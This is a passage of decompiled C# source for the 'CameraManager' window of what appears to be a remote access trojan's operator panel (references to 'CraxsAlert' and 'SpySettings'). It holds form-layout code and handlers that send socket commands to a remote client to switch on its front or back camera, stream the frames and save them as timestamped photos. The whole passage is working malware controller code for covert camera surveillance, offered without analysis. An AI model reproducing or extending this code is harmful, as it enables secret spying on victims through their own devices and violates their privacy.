            // statustext
            // 
            this.statustext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.statustext.Font = new System.Drawing.Font("Calibri", 8.7F);
            this.statustext.ForeColor = System.Drawing.Color.Lime;
            this.statustext.Location = new System.Drawing.Point(0, 0);
            this.statustext.Name = "statustext";
            this.statustext.Size = new System.Drawing.Size(602, 16);
            this.statustext.TabIndex = 15;
            this.statustext.Text = "Select Camera ...";
            // 
            // Label2
            // 
            this.Label2.AutoSize = true;
            this.Label2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.Label2.Font = new System.Drawing.Font("Calibri", 10F, System.Drawing.FontStyle.Bold);
            this.Label2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(95)))), ((int)(((byte)(95)))), ((int)(((byte)(250)))));
            this.Label2.Location = new System.Drawing.Point(426, 215);
            this.Label2.Name = "Label2";
            this.Label2.Size = new System.Drawing.Size(42, 17);
            this.Label2.TabIndex = 15;
            this.Label2.Text = "Focus";
            // 
            // cmbofoucs
            // 
            this.cmbofoucs.BackColor = System.Drawing.Color.Black;
            this.cmbofoucs.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cmbofoucs.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.cmbofoucs.ForeColor = System.Drawing.Color.White;
            this.cmbofoucs.Items.AddRange(new object[] {
            "Yes",
            "No"});
            this.cmbofoucs.Location = new System.Drawing.Point(337, 213);
            this.cmbofoucs.Name = "cmbofoucs";
            this.cmbofoucs.Size = new System.Drawing.Size(83, 21);
            this.cmbofoucs.TabIndex = 16;
            // 
            // Label1
            // 
            this.Label1.AutoSize = true;
            this.Label1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.Label1.Font = new System.Drawing.Font("Calibri", 10F, System.Drawing.FontStyle.Bold);
            this.Label1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(95)))), ((int)(((byte)(95)))), ((int)(((byte)(250)))));
            this.Label1.Location = new System.Drawing.Point(426, 176);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(48, 17);
            this.Label1.TabIndex = 14;
            this.Label1.Text = "Qualty";
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Black;
            this.Panel2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.Panel2.Controls.Add(this.Label2);
            this.Panel2.Controls.Add(this.cmbofoucs);
            this.Panel2.Controls.Add(this.Label1);
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel2.Location = new System.Drawing.Point(0, 575);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(602, 11);
            this.Panel2.TabIndex = 1;
            // 
            // ToolTip1
            // 
            this.ToolTip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.ToolTip1.ForeColor = System.Drawing.Color.DarkTurquoise;
            // 
            // DrakeUIToolTip1
            // 
            this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(54)))), ((int)(((byte)(54)))));
            this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(239)))), ((int)(((byte)(239)))));
            this.DrakeUIToolTip1.OwnerDraw = true;
            // 
            // savetimer
            // 
            this.savetimer.Tick += new System.EventHandler(this.Savetimer_Tick);
            // 
            // CameraManager
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(602, 602);
            this.Controls.Add(this.Panel1);
            this.Controls.Add(this.Panel2);
            this.Controls.Add(this.Panel4);
            this.Controls.Add(this.fpstext);
            this.Font = new System.Drawing.Font("Calibri", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(618, 641);
            this.MinimumSize = new System.Drawing.Size(618, 641);
            this.Name = "CameraManager";
            this.Opacity = 0D;
            this.Text = "CameraManager";
            ((System.ComponentModel.ISupportInitialize)(this.CAM0)).EndInit();
            this.Panel1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).EndInit();
            this.Panel3.ResumeLayout(false);
            this.Panel4.ResumeLayout(false);
            this.Panel2.ResumeLayout(false);
            this.Panel2.PerformLayout();
            this.ResumeLayout(false);

	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	public void addsizes(object[] objs)
	{
		if (base.InvokeRequired)
		{
			addsizedele method = addsizes;
			Invoke(method, new object[1] { objs });
			return;
		}
		string[] array = (string[])objs[0];
		if (array != null && array.Length > 0)
		{
			string[] array2 = array;
			foreach (string text in array2)
			{
				combosizes.Items.Add(text.Replace("[", "").Replace("]", ""));
			}
			combosizes.Text = array[0];
			combosizes.MaxDropDownItems = array.Length;
		}
	}

	private void tranlsateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				startbtn.Text = Codes.Translate(startbtn.Text, "en", "zh");
				Sbtn.Text = Codes.Translate(Sbtn.Text, "en", "zh");
				combotext.Text = Codes.Translate(combotext.Text, "en", "zh");
				qultytext.Text = Codes.Translate(qultytext.Text, "en", "zh");
			}
		}
		else
		{
			startbtn.Text = Codes.Translate(startbtn.Text, "en", "ar");
			Sbtn.Text = Codes.Translate(Sbtn.Text, "en", "ar");
			combotext.Text = Codes.Translate(combotext.Text, "en", "ar");
			qultytext.Text = Codes.Translate(qultytext.Text, "en", "ar");
		}
	}

	private void CameraManager_Load(object sender, EventArgs e)
	{
		base.Tag = "Cam_" + classClient.UUID;
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\6.ico");
		cmbofoucs.Text = "No";
		Frames.Start();
		ClientPic.Image = classClient.Wallpaper;
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		tranlsateme();
		Focus();
		TOpacity.Enabled = true;
		SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
		keepmeto = true;
	}

	private void Frames_Tick(object sender, EventArgs e)
	{
		FPS = FPSTMP;
		FPSTMP = 0;
		SizeFrame = "0 kb";
	}

	private void CAM0_MouseHover(object sender, EventArgs e)
	{
	}

	private void CAM0_MouseLeave(object sender, EventArgs e)
	{
	}

	public void UpdateFPS()
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			newphoto = true;
			fpstext.Text = " FPS : <" + Conversions.ToString(FPS) + "> - SPEED : <" + SizeFrame + ">";
		}));
	}

	public Image RotateFlip(Image imag)
	{
		try
		{
			TempImage.Image = imag;
			if (TempImage != null)
			{
				switch (KEYsx)
				{
				case "Down":
					TempImage.Image.RotateFlip(RotateFlipType.RotateNoneFlipX);
					TempImage.Tag = "180y";
					break;
				case "Up":
					TempImage.Image.RotateFlip(RotateFlipType.Rotate180FlipX);
					TempImage.Tag = "180x";
					break;
				case "Left":
					TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone);
					TempImage.Tag = "270n";
					break;
				case "Right":
					TempImage.Image.RotateFlip(RotateFlipType.Rotate90FlipNone);
					TempImage.Tag = "90n";
					break;
				}
				return TempImage.Image;
			}
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	private void Button4_Click(object sender, EventArgs e)
	{
	}

	private void Button3_Click(object sender, EventArgs e)
	{
	}

	private void CameraManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		boSave = false;
		DrakeUILampLED1.Enabled = false;
		DrakeUILampLED1.Visible = false;
		DrakeUILampLED1.Blink = false;
		Frames.Stop();
		Frames.Dispose();
		DrakeUILampLED1.Dispose();
		Frames.Enabled = false;
		if (Changed && classCamera != null)
		{
			classCamera.qit = true;
			classCamera.Close(classCamera.myClient);
		}
	}

	public void Selected(string V)
	{
		try
		{
			if (classClient == null || Operators.CompareString(CamerID, "null", TextCompare: false) == 0)
				return;
			Client client = classClient;
			TcpClient client2 = Client;
			string[] array = client.Keys.Split(':');
			int num = ((Operators.CompareString(cmbofoucs.Text, "Yes", TextCompare: false) == 0) ? 1 : 0);
			int num2 = 1;
			string text = "";
			string text2 = "";
			try
			{
				if (combosizes.Visible)
				{
					string[] array2 = combosizes.Text.Split('x');
					text = array2[0];
					text2 = array2[1];
				}
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				text = Conversions.ToString(460);
				text2 = Conversions.ToString(840);
				//////CraxsAlert.Showinformation("Sorry");
			}
			string text3 = comboqualty.Text;
			if (client.Isv4)
			{
				object[] parametersObjects = new object[4]
				{
					client2,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + V + "," + text + "," + text2 + "," + text3 + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.getCamera + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(parametersObjects);
			}
			else
			{
				object[] parametersObjects2 = new object[4]
				{
					client2,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + V + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.getCamera + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(parametersObjects2);
			}
			CAM0.Image = Resources.onloading;
			statustext.Text = "Please Wait....";
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError2);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void DrakeUIButton2_Click(object sender, EventArgs e)
	{
		if (Changed)
		{
			Changed = false;
			if (classCamera != null)
			{
				statustext.Text = "Select Camera...";
				classCamera.qit = true;
				classCamera.Close(classCamera.myClient);
			}
		}
		startbtn.Enabled = true;
		CAM0.Image = null;
		Sbtn.Enabled = false;
		Button3.Enabled = false;
	}

	private void DrakeUIButton1_Click_2(object sender, EventArgs e)
	{
	}

	private void DrakeUIButton2_Click_1(object sender, EventArgs e)
	{
	}

	private void Addpo_Click(object sender, EventArgs e)
	{
		if (CAM0.Image == null)
			return;
		if (Operators.CompareString(Button3.Tag.ToString(), "off", TextCompare: false) == 0)
		{
			DrakeUILampLED1.Enabled = true;
			DrakeUILampLED1.Visible = true;
			DrakeUILampLED1.Blink = true;
			Button3.Tag = "on";
			savetimer.Start();
			Button3.Text = "ON";
			Button3.ForeColor = Color.Lime;
			boSave = true;
		}
		else if (Operators.CompareString(Button3.Tag.ToString(), "on", TextCompare: false) == 0)
		{
			DrakeUILampLED1.Enabled = false;
			DrakeUILampLED1.Visible = false;
			DrakeUILampLED1.Blink = false;
			Button3.Tag = "off";
			Button3.ForeColor = Color.FromArgb(157, 5, 17);
			savetimer.Stop();
			Button3.Text = "Save";
			string text = tmpFolderUSER + "\\Camera Manager";
			if (!Directory.Exists(text))
				Directory.CreateDirectory(text);
			Process.Start(text);
			Button3.ForeColor = Color.White;
			Button3.BackColor = Color.Transparent;
			boSave = false;
		}
	}

	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (CAM0.Image != null)
		{
			if (Operators.CompareString(KEYsx, "Right", TextCompare: false) == 0)
				KEYsx = "Down";
			else if (Operators.CompareString(KEYsx, "Down", TextCompare: false) == 0)
			{
				KEYsx = "Left";
			}
			else if (Operators.CompareString(KEYsx, "Left", TextCompare: false) == 0)
			{
				KEYsx = "Up";
			}
			else if (Operators.CompareString(KEYsx, "Up", TextCompare: false) == 0)
			{
				KEYsx = "Right";
			}
			else
			{
				KEYsx = "Right";
			}
		}
	}

	private void Savetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = tmpFolderUSER + "\\Camera Manager";
			if (boSave)
			{
				if (newphoto)
				{
					newphoto = false;
					if (!Directory.Exists(text))
						Directory.CreateDirectory(text);
					if (Directory.Exists(text))
						CAM0.Image.Save(text + "\\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
				}
			}
			else
			{
				savetimer.Stop();
				savetimer.Dispose();
			}
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void DrakeUIButton1_Click_3(object sender, EventArgs e)
	{
		string left = combocam.Text;
		if (Operators.CompareString(left, "Front", TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, "Back", TextCompare: false) == 0)
			{
				statustext.Text = "Selected : Back Camera, Please Wait...";
				Sbtn.Enabled = true;
				startbtn.Enabled = false;
				CamerID = "0";
				Selected("0");
				SelectedCamera = "Back Camera";
			}
		}
		else
		{
			statustext.Text = "Selected : Front Camera, Please Wait...";
			Sbtn.Enabled = true;
			startbtn.Enabled = false;
			CamerID = "1";
			Selected("1");
			SelectedCamera = "Front Camera";
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(hidetoolbtn.TagString, "s", TextCompare: false) == 0)
		{
			hidetoolbtn.TagString = "h";
			Panel2.Enabled = false;
			Panel2.Visible = false;
		}
		else
		{
			hidetoolbtn.TagString = "s";
			Panel2.Enabled = true;
			Panel2.Visible = true;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		if (keepmeto)
		{
			pinbtn.ForeColor = Color.Lime;
			SetWindowPos(hWndInsertAfter: new IntPtr(-1), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = false;
		}
		else
		{
			pinbtn.ForeColor = Color.Red;
			SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = true;
		}
	}

    private void drakeUIButtonIcon2_Click(object sender, EventArgs e)
    {
        string left = combocam.Text;
        if (Operators.CompareString(left, "Front", TextCompare: false) != 0)
        {
            if (Operators.CompareString(left, "Back", TextCompare: false) == 0)
            {
                statustext.Text = "Selected : Back Camera, Please Wait...";
                Sbtn.Enabled = true;
                startbtn.Enabled = false;
                CamerID = "0";
                Selected("0");
                SelectedCamera = "Back Camera";
            }
        }
        else
        {
            statustext.Text = "Selected : Front Camera, Please Wait...";
            Sbtn.Enabled = true;
            startbtn.Enabled = false;
            CamerID = "1";
            Selected("1");
            SelectedCamera = "Front Camera";
        }
    }

    private void drakeUIButtonIcon1_Click_2(object sender, EventArgs e)
    {
        if (Changed)
        {
            Changed = false;
            if (classCamera != null)
            {
                statustext.Text = "Select Camera...";
                classCamera.qit = true;
                classCamera.Close(classCamera.myClient);
            }
        }
        startbtn.Enabled = true;
        CAM0.Image = null;
        Sbtn.Enabled = false;
        Button3.Enabled = false;
    }
}
